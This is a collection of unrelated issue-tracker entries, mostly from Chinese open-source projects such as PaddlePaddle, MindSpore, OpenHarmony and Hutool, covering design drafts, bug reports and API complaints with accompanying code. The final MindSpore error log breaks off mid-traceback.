"[draft] add registry for Op, OpProto and OpAttrChecker","This is a draft to show our design about how to implement registry mechanisms of Op, OpProto and OpAttrChecker. For convenience, a small part of is written with pseudocode. It is indicated by comments and .   <code>: attr_checker.h ==pseudocode begin== ==pseudocode end=="
【star】cms模块内容自定义url教程.非诚勿扰.,"本教程需要修改3~4个php文件,需要有一定的php基础.(当然不会的照着改也没事) 改后效果 原url:www.xx.com/news/1.html 现url:www.xx.com/news/a.html 使用场景:seo优化 上干货 1,登录后台,随便添加一篇文章,在链接地址那输入""abc"",随便输是字母就行.(不要有特殊符号什么的就行,不要扛)如下图 修改目录:application\cms\controller\Index.php的shows方法,主要是根据url的参数来获取数据,代码如下 5,有问题留言.   <code>: Route::rule(':catdir/:id', 'cms/index/shows')-&gt;pattern(['catdir' =&gt; '[A-Za-z0-9\-\_]+', 'id' =&gt; '[A-Za-z0-9\-\_]+']); function buildContentUrl($cat, $id, $url = '', $suffix = true, $domain = false) { $field = is_numeric($cat) ? 'catid' : 'catdir'; $fixurl = ''; if(!empty($url)){ if(strpos($url, '://') !== false){ $fixurl = $url; }else{ if(strpos($url, '/') !== false){ $fixurl = url($url); }else{ //处理自定义链接字母 $fixurl = url('cms/index/shows',[$field =&gt; $cat,'id'=&gt;$url]); } } } return empty($url) ? url('cms/index/shows', [$field =&gt; $cat, 'id' =&gt; $id], $suffix, $domain) : $fixurl; } // 内容页 public function shows() { //ID $id = $this-&gt;request-&gt;param('id/d', 0); $cat = $this-&gt;request-&gt;param('catid/d', 0); if (empty($cat)) { $cat = $this-&gt;request-&gt;param('catdir/s', ''); } $field = 'id'; if (empty($id)) { $field = 'url'; $id = $this-&gt;request-&gt;param('id/s', ''); } $page = $this-&gt;request-&gt;param('page/d', 1); $page = max(1, $page); //获取栏目数据 $category = getCategory($cat); if (empty($category)) { throw new \think\exception\HttpException(404, '栏目不存在！'); } $catid = $category['catid'] = $category['id']; unset($category['id']); //模型ID $modelid = $category['modelid']; $modelInfo = cache('Model')[$modelid]; if (empty($modelInfo)) { throw new \think\exception\HttpException(404, '模型不存在！'); } //更新点击量 Db::name($modelInfo['tablename'])-&gt;where('id', $id)-&gt;setInc('hits'); //内容所有字段 $ifcache = $this-&gt;cmsConfig['site_cache_time'] ? $this-&gt;cmsConfig['site_cache_time'] : false; $info = $this-&gt;Cms_Model-&gt;getContent($modelid, ['catid' =&gt; $catid, $field =&gt; $id], true, '*', '', $ifcache); if (!$info || ($info['status'] !== 1 &amp;&amp; !\app\admin\service\User::instance()-&gt;isLogin())) { throw new \think\exception\HttpException(404, '内容不存在或未审核!'); }"
Error/Gradient clipping survey and plan,"Gradient Clipping Exploding gradients can be handled by gradient clipping. Before optimizing a parameter, we can clip its gradient to stabilize the training process. The simplest clipping is just . It means we will limit the values of tensor within [clip_min, clip_max]. Every value of this tensor is larger than clip_max, will be clip_max. Every value of this tensor is less than clip_min, will be clip_min. Just clip a value is not good because it will change the direction of gradients. If we do not want to change the direction of one gradient of the parameter, we can just scale the gradient and make the l2-norm of this gradient is less than a limit. If we want the whole direction of gradients are not changed, we can scale all gradients and make the l2-norm of them is less than a limit. So, there are two methods will be implemented. , which will takes a list of gradient. There could be two higher level API and , which will pass the current gradient or all gradients to Error clipping Just clipping the gradient after backwards cannot handle the exploding while backwards. Gradients could have been exploded during calculate the backward stage. There is a trick in the previous Paddle called . It just clipping the gradient of hidden layers while backwards. Tensorflow does not provide this feature by default, but a user could implement this feature by hacking backwards method. We should make our customizable in Python to support or other manipulation. Maybe we can add a backward in Python and takes a Python callback. If the user does not provide any callback, it just generates backward operator in normal. If user customizes that callback, users can create by themselves.   <code>: clip_by_value clip_by_value clip_by_l2_norm clip_by_local_l2_norm clip_by_global_l2_norm clip_by_l2_norm error clipping backward error clipping error clipping"
不分离版本：表格相关问题请教,"1、当表格中字段过多，设置width，会挤压其他字段已设置的宽度，如用户名称设置宽度为300，操作列为280，操作列宽度被挤压； 字段较少时，设置宽度正常，如图一： 4、超出指定长度浮动提示（单击文本可复制），未实现文本复制； 复现代码，博主可直接替换 user.html 中原代码即可： 以上4个问题，非常感谢博主答疑。吃水不忘挖井人，再次感谢博主。   <code>: &lt;!DOCTYPE html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org"" xmlns:shiro=""http://www.pollix.at/thymeleaf/shiro""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('用户列表')"" /&gt; &lt;th:block th:include=""include :: layout-latest-css"" /&gt; &lt;th:block th:include=""include :: ztree-css"" /&gt; &lt;/head&gt; &lt;body class=""gray-bg""&gt; &lt;div class=""ui-layout-west""&gt; &lt;div class=""box box-main""&gt; &lt;div class=""box-header""&gt; &lt;div class=""box-title""&gt; &lt;i class=""fa icon-grid""&gt;&lt;/i&gt; 组织机构 &lt;/div&gt; &lt;div class=""box-tools pull-right""&gt; &lt;a type=""button"" class=""btn btn-box-tool"" href=""#"" onclick=""dept()"" title=""管理部门""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;&lt;/a&gt; &lt;button type=""button"" class=""btn btn-box-tool"" id=""btnExpand"" title=""展开"" style=""display:none;""&gt;&lt;i class=""fa fa-chevron-up""&gt;&lt;/i&gt;&lt;/button&gt; &lt;button type=""button"" class=""btn btn-box-tool"" id=""btnCollapse"" title=""折叠""&gt;&lt;i class=""fa fa-chevron-down""&gt;&lt;/i&gt;&lt;/button&gt; &lt;button type=""button"" class=""btn btn-box-tool"" id=""btnRefresh"" title=""刷新部门""&gt;&lt;i class=""fa fa-refresh""&gt;&lt;/i&gt;&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=""ui-layout-content""&gt; &lt;div id=""tree"" class=""ztree""&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=""ui-layout-center""&gt; &lt;div class=""container-div""&gt; &lt;div class=""row""&gt; &lt;div class=""col-sm-12 search-collapse""&gt; &lt;form id=""user-form""&gt; &lt;input type=""hidden"" id=""deptId"" name=""deptId""&gt; &lt;input type=""hidden"" id=""parentId"" name=""parentId""&gt; &lt;div class=""select-list""&gt; &lt;ul&gt; &lt;li&gt; 登录名称：&lt;input type=""text"" name=""loginName""/&gt; &lt;/li&gt; &lt;li&gt; 手机号码：&lt;input type=""text"" name=""phonenumber""/&gt; &lt;/li&gt; &lt;li&gt; 用户状态：&lt;select name=""status"" th:with=""type=${@dict.getType('sys_normal_disable')}""&gt; &lt;option value=""""&gt;所有&lt;/option&gt; &lt;option th:each=""dict : ${type}"" th:text=""${dict.dictLabel}"" th:value=""${dict.dictValue}""&gt;&lt;/option&gt; &lt;/select&gt; &lt;/li&gt; &lt;li class=""select-time""&gt; &lt;label&gt;创建时间： &lt;/label&gt; &lt;input type=""text"" class=""time-input"" id=""startTime"" placeholder=""开始时间"" name=""params[beginTime]""/&gt; &lt;span&gt;-&lt;/span&gt; &lt;input type=""text"" class=""time-input"" id=""endTime"" placeholder=""结束时间"" name=""params[endTime]""/&gt; &lt;/li&gt; &lt;li&gt; &lt;a class=""btn btn-primary btn-rounded btn-sm"" onclick=""$.table.search()""&gt;&lt;i class=""fa fa-search""&gt;&lt;/i&gt;&amp;nbsp;搜索&lt;/a&gt; &lt;a class=""btn btn-warning btn-rounded btn-sm"" onclick=""$.form.reset()""&gt;&lt;i class=""fa fa-refresh""&gt;&lt;/i&gt;&amp;nbsp;重置&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;div class=""btn-group-sm"" id=""toolbar"" role=""group""&gt; &lt;a class=""btn btn-success"" onclick=""$.operate.addTab()"" shiro:hasPermission=""system:user:add""&gt; &lt;i class=""fa fa-plus""&gt;&lt;/i&gt; 新增 &lt;/a&gt; &lt;a class=""btn btn-primary single disabled"" onclick=""$.operate.editTab()"" shiro:hasPermission=""system:user:edit""&gt; &lt;i class=""fa fa-edit""&gt;&lt;/i&gt; 修改 &lt;/a&gt; &lt;a class=""btn btn-danger multiple disabled"" onclick=""$.operate.removeAll()"" shiro:hasPermission=""system:user:remove""&gt; &lt;i class=""fa fa-remove""&gt;&lt;/i&gt; 删除 &lt;/a&gt; &lt;a class=""btn btn-info"" onclick=""$.table.importExcel()"" shiro:hasPermission=""system:user:import""&gt; &lt;i class=""fa fa-upload""&gt;&lt;/i&gt; 导入 &lt;/a&gt; &lt;a class=""btn btn-warning"" onclick=""$.table.exportExcel()"" shiro:hasPermission=""system:user:export""&gt; &lt;i class=""fa fa-download""&gt;&lt;/i&gt; 导出 &lt;/a&gt; &lt;/div&gt; &lt;div class=""col-sm-12 select-table table-bordered""&gt; &lt;table id=""bootstrap-table"" data-resizable=""true""&gt;&lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;th:block th:include=""include :: footer"" /&gt; &lt;th:block th:include=""include :: layout-latest-js"" /&gt; &lt;th:block th:include=""include :: ztree-js"" /&gt; &lt;th:block th:include=""include :: bootstrap-table-resizable-js"" /&gt; &lt;script th:inline=""javascript""&gt; var editFlag = [[${@permission.hasPermi('system:user:edit')}]]; var removeFlag = [[${@permission.hasPermi('system:user:remove')}]]; var resetPwdFlag = [[${@permission.hasPermi('system:user:resetPwd')}]]; var prefix = ctx + ""system/user""; $(function() { var panehHidden = false; if ($(this).width() &lt; 769) { panehHidden = true; } $('body').layout({ initClosed: panehHidden, west__size: 185 }); // 回到顶部绑定 if ($.fn.toTop !== undefined) { var opt = { win:$('.ui-layout-center'), doc:$('.ui-layout-center') }; $('#scroll-up').toTop(opt); } queryUserList(); queryDeptTree(); }); function queryUserList() { var options = { url: prefix + ""/list"", createUrl: prefix + ""/add"", updateUrl: prefix + ""/edit/{id}"", removeUrl: prefix + ""/remove"", exportUrl: prefix + ""/export"", importUrl: prefix + ""/importData"", importTemplateUrl: prefix + ""/importTemplate"", sortName: ""createTime"", sortOrder: ""desc"", modalName: ""用户"", columns: [{ checkbox: true }, { field: 'userId', title: '用户ID' }, { field: 'loginName', title: '登录名称', sortable: true, width:150 }, { field: 'userName', title: '用户名称', width:300, formatter: function(value, row, index) { return $.table.tooltip(value); } }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'userName', title: '用户名称', width:300 }, { field: 'dept.deptName', title: '部门', width:200 }, { field: 'email', title: '邮箱', visible: false, width:200 }, { field: 'phonenumber', title: '手机', width:200 }, { visible: editFlag == 'hidden' ? false : true, title: '用户状态', align: 'center', formatter: function (value, row, index) { return statusTools(row); }, width:200 }, { field: 'createTime', title: '创建时间', sortable: true, width:200 }, { title: '操作', align: 'center', width:190, formatter: function(value, row, index) { if (row.userId != 1) { var actions = []; actions.push('&lt;a class=""btn btn-success btn-xs ' + editFlag + '"" href=""javascript:void(0)"" onclick=""$.operate.editTab(\'' + row.userId + '\')""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;编辑&lt;/a&gt; '); actions.push('&lt;a class=""btn btn-danger btn-xs ' + removeFlag + '"" href=""javascript:void(0)"" onclick=""$.operate.remove(\'' + row.userId + '\')""&gt;&lt;i class=""fa fa-remove""&gt;&lt;/i&gt;删除&lt;/a&gt; '); var more = []; more.push(""&lt;a class='btn btn-default btn-xs "" + resetPwdFlag + ""' href='javascript:void(0)' onclick='resetPwd("" + row.userId + "")'&gt;&lt;i class='fa fa-key'&gt;&lt;/i&gt;重置密码&lt;/a&gt; ""); more.push(""&lt;a class='btn btn-default btn-xs "" + editFlag + ""' href='javascript:void(0)' onclick='authRole("" + row.userId + "")'&gt;&lt;i class='fa fa-check-square-o'&gt;&lt;/i&gt;分配角色&lt;/a&gt;""); actions.push('&lt;a tabindex=""0"" class=""btn btn-info btn-xs"" role=""button"" data-container=""body"" data-placement=""left"" data-toggle=""popover"" data-html=""true"" data-trigger=""hover"" data-content=""' + more.join('') + '""&gt;&lt;i class=""fa fa-chevron-circle-right""&gt;&lt;/i&gt;更多操作&lt;/a&gt;'); return actions.join(''); } else { return """"; } } }] }; $.table.init(options); } function queryDeptTree() { var url = ctx + ""system/dept/treeData""; var options = { url: url, expandLevel: 2, onClick : zOnClick }; $.tree.init(options); function zOnClick(event, treeId, treeNode) { $(""#deptId"").val(treeNode.id); $(""#parentId"").val(treeNode.pId); $.table.search(); } } $('#btnExpand').click(function() { $._tree.expandAll(true); $(this).hide(); $('#btnCollapse').show(); }); $('#btnCollapse').click(function() { $._tree.expandAll(false); $(this).hide(); $('#btnExpand').show(); }); $('#btnRefresh').click(function() { queryDeptTree(); }); /* 用户管理-部门 */ function dept() { var url = ctx + ""system/dept""; $.modal.openTab(""部门管理"", url); } /* 用户管理-重置密码 */ function resetPwd(userId) { var url = prefix + '/resetPwd/' + userId; $.modal.open(""重置密码"", url, '800', '300'); } /* 用户管理-分配角色 */ function authRole(userId) { var url = prefix + '/authRole/' + userId; $.modal.openTab(""用户分配角色"", url); } /* 用户状态显示 */ function statusTools(row) { if (row.status == 1) { return '&lt;i class=\""fa fa-toggle-off text-info fa-2x\"" onclick=""enable(\'' + row.userId + '\')""&gt;&lt;/i&gt; '; } else { return '&lt;i class=\""fa fa-toggle-on text-info fa-2x\"" onclick=""disable(\'' + row.userId + '\')""&gt;&lt;/i&gt; '; } } /* 用户管理-停用 */ function disable(userId) { $.modal.confirm(""确认要停用用户吗？"", function() { $.operate.post(prefix + ""/changeStatus"", { ""userId"": userId, ""status"": 1 }); }) } /* 用户管理启用 */ function enable(userId) { $.modal.confirm(""确认要启用用户吗？"", function() { $.operate.post(prefix + ""/changeStatus"", { ""userId"": userId, ""status"": 0 }); }) } &lt;/script&gt; &lt;/body&gt; &lt;!-- 导入区域 --&gt; &lt;script id=""importTpl"" type=""text/template""&gt; &lt;form enctype=""multipart/form-data"" class=""mt20 mb10""&gt; &lt;div class=""col-xs-offset-1""&gt; &lt;input type=""file"" id=""file"" name=""file""/&gt; &lt;div class=""mt10 pt5""&gt; &lt;input type=""checkbox"" id=""updateSupport""` name=""updateSupp`ort"" title=""如果登录账户已经存在，更新这条数据。""&gt; 是否更新已经存在的用户数据 &amp;nbsp; &lt;a onclick=""$.table.importTemplate()"" class=""btn btn-default btn-xs""&gt;&lt;i class=""fa fa-file-excel-o""&gt;&lt;/i&gt; 下载模板&lt;/a&gt; &lt;/div&gt; &lt;font color=""red"" class=""pull-left mt10""&gt; 提示：仅允许导入“xls”或“xlsx”格式文件！ &lt;/font&gt; &lt;/div&gt; &lt;/form&gt; &lt;/script&gt; &lt;/html&gt;"
Data Converter for Python API,"作用 在 https://github.com/PaddlePaddle/Paddle/pull/1345 里，我们描述了data reader机制。这个机制读取数据，并且输出Python的list类型或者numpy的Array类型的数据。在训练的时候，我们需要将这些数据转换为 PaddlePaddle API接口(目前为SWIG)可接受的数据类型。 主要两点： 每路数据按类型转换 多路数据输入顺序 C++数据结构 forward输入和输出的数据结构为Argument: Argument主要结构如下： MatrixPtr value : Matrix or SparseMatrix dense_vector : 稠密矩阵 sparse_non_value : 稀疏矩阵 sparse_float: 稀疏带权矩阵 IVectorPtr ids : 整数vector IVectorPtr sequenceStartPositions：整数vector 句子相关任务，和value、ids配合使用，指示每个样本在ids、value中的起始位置。 针对不同任务，数据类型不同，需要将其对应到C++数据结构中。 用法 paddle.train()里reader 产生多路输入数据 每列数据是一个特征的一个mini-batch的数据, 类型为Python类型， List 或者 Numpy Array等。 在forwardBackward之前，需要将数据转换为API接口暴露的数据(目前为swig_paddle.Arguments)。 用法： 目前C++里是通过类似Inputs('image', 'label')标识多路数据输入顺序，在数据转换里会按照此顺序存入API接口里。 DataConverter(inputs)中的inputs是从网络拓扑(topology)中获取的数据输入【顺序及类型】， 比如： 设计 各类型转换类： DenseConvert, SparseBinaryConvert, SparseFloatConvert, IndexConvert 转换不同的类型数据 填充Argument里的 SequenceConvert 转换sequence数据，内嵌了上述4种类型转换，填充。 DataConverter 用户接口，用法如上   <code>: void MultiGradientMachine::forwardBackward( const std::vector&lt;Argument&gt;&amp; inArgs, std::vector&lt;Argument&gt;* outArgs, PassType passType, const UpdateCallback&amp; callback) {...} Argument { MatrixPtr value; # Matrix or SparseMatrix IVectorPtr ids; IVectorPtr sequenceStartPositions； } 数据：minibatch_data = (column0, column1, column2, ...) 词典指示: {'image':0, 'label':1} converter = DataConverter(inputs) arg = converter(minibatch_data, {'image':0, 'label':1}) [('image', dense_vector(784)), ('label', integer_value(10))] MatrixPtr value 和 IVectorPtr ids IVectorPtr sequenceStartPositions"
paddlepaddle是自动判断权重共享的吗？我需要像tensorflow那样传reuse参数吗？,"paddlepaddle是自动判断权重共享的吗？我需要像tensorflow那样传reuse参数吗？ 类似GAN中我需要重复使用D模型，paddle是直接判断shape然后判断是否reuse吗？   <code>: def discriminator(self, x, y_, scope='discriminator', is_training=True, reuse=False): with tf.variable_scope(scope, reuse=reuse) : x = dropout(x, rate=0.2, is_training=is_training) y = tf.reshape(y_, [-1, 1, 1, self.y_dim]) x = conv_concat(x,y) x = lrelu(conv_layer(x, filter_size=32, kernel=[3,3], layer_name=scope+'_conv1')) x = conv_concat(x,y) x = lrelu(conv_layer(x, filter_size=32, kernel=[3,3], stride=2, layer_name=scope+'_conv2')) x = dropout(x, rate=0.2, is_training=is_training) x = conv_concat(x,y) x = lrelu(conv_layer(x, filter_size=64, kernel=[3,3], layer_name=scope+'_conv3')) x = conv_concat(x,y) x = lrelu(conv_layer(x, filter_size=64, kernel=[3,3], stride=2, layer_name=scope+'_conv4')) x = dropout(x, rate=0.2, is_training=is_training) x = conv_concat(x,y) x = lrelu(conv_layer(x, filter_size=128, kernel=[3,3], layer_name=scope+'_conv5')) x = conv_concat(x,y) x = lrelu(conv_layer(x, filter_size=128, kernel=[3,3], layer_name=scope+'_conv6')) x = conv_concat(x,y) x = Global_Average_Pooling(x) x = flatten(x) x = concat([x,y_]) # mlp_concat x_logit = linear(x, unit=1, layer_name=scope+'_linear1') out = sigmoid(x_logit) return out, x_logit, x"
mplfe should avoid using OP_cvt for integer types less than 32 bits,"An example is pr58726.c in ctorture. The .mpl generated by mplfe has these questionable cvt's: Because the smallest register size is 32 bits, cvt's that have either result type or operand type less than 32 bits are not well-defined, and their semantics is not clear It is preferred and would be much more semantically explicit to use OP_zext and OP_sext instructions instead. In Maple IR, regardless of the opcode, the result PrimType should never be less than 32 bits, because the result must be stored in a register and the smallest register is 32 bits.   <code>: cvt i32 i16 (dread i32 %p), dassign %levVar_1 0 (cvt i32 i16 (dread i32 %p)) return (cvt i16 i32 (dread i32 %levVar_1)) dassign %d_19_3 0 (cvt u16 i32 (dread i32 %levVar_9)) callassigned &amp;foo (cvt i16 u16 (dread u32 %d_19_3)) { dassign %retVar_11 0 } dassign $c 0 (cvt i32 i16 (dread i32 %retVar_11)) cvt i32 i16 (cvt i16 i32 (constval i32 0xdc36)))) {"
【OpenHarmony】【2.3_Beta】【轻内核子系统】集成测试pread函数返回值与之前版本不一致,"【OpenHarmony】【2.3_Beta】【轻内核子系统】集成测试pread函数返回值与之前版本不一致 【测试版本】 hispark_taurus版本： http://download.ci.openharmony.cn/version/Master_Version/OpenHarmony_2.3_Beta/20210721_011042/version-Master_Version-OpenHarmony_2.3_Beta-20210721_011042-hispark_taurus.tar.gz 【测试步骤】 1.Hi3516dv300板子烧写2.3_Beta版本，正常启动挂载成功 2.执行命令./HitsIoPosixTest.bin 【测试用例】 1./* * @tc.number SUB_KERNEL_IO_OTHER_1080 @tc.name pread basic function test The input data is empty @tc.desc [C- SOFTWARE -0200] */ HWTEST_F(IoTestExt, testPreadExt0200, Function | MediumTest | Level2) { int fd = 0; char buf[MAX_BUFFER_SIZE] = {0}; int count = 128; int offset = 1; FILE *fp = nullptr; FOPEN_WRITE(fp); fputs("""", fp); EXPECT_NE(fclose(fp), -1) &lt;&lt; ""&gt; fclose fail, errno = "" &lt;&lt; errno; fp = nullptr; FOPEN_READ(fp); FILENO(fp); int ret = pread(fd, buf, count, offset); EXPECT_EQ(ret, 0); EXPECT_STREQ(buf, """"); EXPECT_NE(fclose(fp), -1) &lt;&lt; ""&gt; fclose fail, errno = "" &lt;&lt; errno; } 2./* * @tc.number SUB_KERNEL_IO_OTHER_1120 @tc.name pread basic function test The offset is greater than the number of bytes file @tc.desc [C- SOFTWARE -0200] */ HWTEST_F(IoTestExt, testPreadExt0500, Function | MediumTest | Level2) { int fd = 0; char buf[MAX_BUFFER_SIZE] = {0}; int count = 128; int offset = 12; FILE *fp = nullptr; FOPEN_WRITE(fp); fputs(""123456789"", fp); EXPECT_NE(fclose(fp), -1) &lt;&lt; ""&gt; fclose fail, errno = "" &lt;&lt; errno; fp = nullptr; FOPEN_READ(fp); FILENO(fp); int ret = pread(fd, buf, count, offset); EXPECT_EQ(ret, 0); EXPECT_STREQ(buf, """"); EXPECT_NE(fclose(fp), -1) &lt;&lt; ""&gt; fclose fail, errno = "" &lt;&lt; errno; } 【测试log】 [ RUN ] IoTestExt.testPreadExt0200 ../../../test/xts/huawei_proprietary/hits/kernel_lite/io_posix/src/IoTestOtherExt1.cpp:63: Failure Expected equality of these values: ret 0 [ FAILED ] IoTestExt.testPreadExt0200 (12 ms) [ RUN ] IoTestExt.testPreadExt0500 ../../../test/xts/huawei_proprietary/hits/kernel_lite/io_posix/src/IoTestOtherExt1.cpp:138: Failure Expected equality of these values: ret 0 [ FAILED ] IoTestExt.testPreadExt0500 (7 ms)   <code>: Which is: -1 Which is: -1"
CollUtil.filter 的实现使用过于复杂,"使用的JDK版本和Hutool版本 JDK 1.8 Hutool 4.1.2 和underscore-java使用对比 各自实现对比   <code>: hutool cn.hutool.core.collection.CollUtil.filter 的实现使用过于复杂. underscore-java 泛型用的更好. 希望hutool 参照 underscore-java,写出更优雅无警告的写法. // hutool 还要类型转换警告 data = (List)CollUtil.filter(data, (Filter&lt;DeviceVO&gt;) o -&gt; o.pic != null); // underscore-java data = $.filter(data, o -&gt; o.pic != null); // hutool实现 cn.hutool.core.collection.CollUtil.filter public static &lt;T&gt; Collection&lt;T&gt; filter(Collection&lt;T&gt; collection, Filter&lt;T&gt; filter) { Collection&lt;T&gt; collection2 = ObjectUtil.clone(collection); try { collection2.clear(); } catch (UnsupportedOperationException e) { // 克隆后的对象不支持清空，说明为不可变集合对象，使用默认的ArrayList保存结果 collection2 = new ArrayList&lt;&gt;(); } for (T t : collection) { if (filter.accept(t)) { collection2.add(t); } } return collection2; } // underscore-java 实现 com.github.underscore.filter public static &lt;E&gt; List&lt;E&gt; filter(List&lt;E&gt; list, Predicate&lt;E&gt; pred) { List&lt;E&gt; filtered = newArrayList(); Iterator var3 = list.iterator(); while(var3.hasNext()) { E element = var3.next(); if ((Boolean)pred.apply(element)) { filtered.add(element); } } return filtered; }"
[Paddle-TRT] potential memory leak,"and should be always implemented as a pair. Also, resources acquired (e.g. malloc, new *, cuadMalloc*, *Create*, etc) in IPlugin*::initialize should be released in . Otherwise, it causes memory leak. I fix a plugin as example, see #24106. Following plugins have the same bug at least: InstanceNormPlugin PReluPlugin SkipLayerNormPluginDynamic Read https://docs.nvidia.com/deeplearning/sdk/tensorrt-developer-guide/index.html#ipluginext to know more.   <code>: IPlugin*::initialize IPlugin*::terminate IPlugin*::terminate"
dataset: add concatDataset operation,"RFC kind/feature Add take op for Dataset to support get certain number of rows(batches) ConcatDataset operation means: Example code output   <code>: def __add__(self, datasets): """""" Concat the datasets in the input list of datasets. Note: The column name，column data type and rank of column data should be the same in input datasets. Args: datasets (list or class Dataset): A list of datasets or a single class Dataset to be concated together with this dataset. Returns: ConcatDataset, dataset concated. Examples: &gt;&gt;&gt; import mindspore.dataset as ds &gt;&gt;&gt; # ds1 and ds2 are instances of Dataset object &gt;&gt;&gt; # creates a dataset by concating ds1 and ds2 &gt;&gt;&gt; data1 = ds1 + ds2 """""" import mindspore.dataset as ds def generator_3(): for i in range(3): yield (np.array([i]), ) def generator_10(): for i in range(3, 10): yield (np.array([i]), ) def test_concat_01(): """""" Test concat: test concat 2 datasets that have the same column name and data type """""" data1 = ds.GeneratorDataset(generator_3, [""col1""]) data2 = ds.GeneratorDataset(generator_10, [""col1""]) data3 = data1 + data2 # Here i refers to index, d refers to data element for i, d in enumerate(data3): logger.info(""data:"", d[0][0]) assert i == d[0][0] assert sum([1 for _ in data3]) == 10 0, 1, 2, 3, 4,5,6,7,8,9"
Why we need CSP in Fluid,"I have two use cases in my mind. 1. Overlap data loading with training (or inference) It is often that loading the minibatches for training takes a lot of time, so we might want to have two threads/fluidroutines -- one loads the data and the othe updates the model. A Go program for this should look like A Fluid/Python program might look like   <code>: ch := make(chan int) go func() { // data loader reader := fluid.data.minist.train() for mb := reader.next(); len(mb) &gt; 0; mb = reader.next() { copy_mb_into_gpu(mb) ch &lt;- 1 // write a notification into the channel } go func() { // trainer for notification := &lt;- ch { train_use_the_current_mb_in_gpu(); } } with fluid.Go(): # the data loader ... with fluid.Go(): # the trainer ..."
[CT][MS]算子maxunpool2d 动态shape报错,"设置input_x, input_argmax 为动态shape后报错 / 硬件环境: /device GPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 passed   <code>: def test_dynamic_shape_maxunpool2d_input_8x12x10x16_int64(): torch_x = torch.from_numpy(np.random.randint(0, 200, (8, 12, 10, 16)).astype(np.float32)) torch_maxunpool = torch.nn.MaxPool2d(kernel_size=2, stride=(2, 2), return_indices=True) output, indices = torch_maxunpool(torch_x) input_x = Tensor(output.numpy().astype(np.int64)) input_argmax = Tensor(indices.numpy().astype(np.int64)) fact = MaxUnpool2DMock(attributes={ 'ksize': 2, 'strides': 2, 'pads': 0 }, inputs=[input_x, input_argmax]) fact.forward_dynamic_shape_cmp() &gt; /home/zx/maxunpool2d/master/MindSporeTest/share/ops/primitive/maxunpool2d_ops.py(220)forward_mindspore_dynamic_shape_impl() -&gt; ms_net.set_inputs(x_dyn, argmax_dyn) (Pdb) x_dyn Tensor(shape=[-1, -1, -1, -1], dtype=Int64, value= ) (Pdb) argmax_dyn Tensor(shape=[-1, -1, -1, -1], dtype=Int64, value= ) (Pdb) n &gt; /home/zx/maxunpool2d/master/MindSporeTest/share/ops/primitive/maxunpool2d_ops.py(221)forward_mindspore_dynamic_shape_impl() -&gt; out_ms = ms_net(self.input_x, self.input_argmax) (Pdb) n ValueError: Shape should have only one -2 or no -2 at all but got ([const vector][-1, -1, -2, -2]). 报错日志 &gt; fact.forward_dynamic_shape_cmp() test_maxunpool2d.py:1074: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/maxunpool2d_ops.py:248: in forward_dynamic_shape_cmp out_ms = self.forward_mindspore_dynamic_shape_impl() ../share/ops/primitive/maxunpool2d_ops.py:221: in forward_mindspore_dynamic_shape_impl out_ms = ms_net(self.input_x, self.input_argmax) /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:619: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:1004: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/zxop3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:987: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7f18923e0090&gt;, obj = DynamicShapeMaxUnpool2D&lt;&gt;, phase = 'train.1666335322756876800.139736254281200.0', do_convert = True auto_parallel_mode = False, jit_config_dict = {} def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") 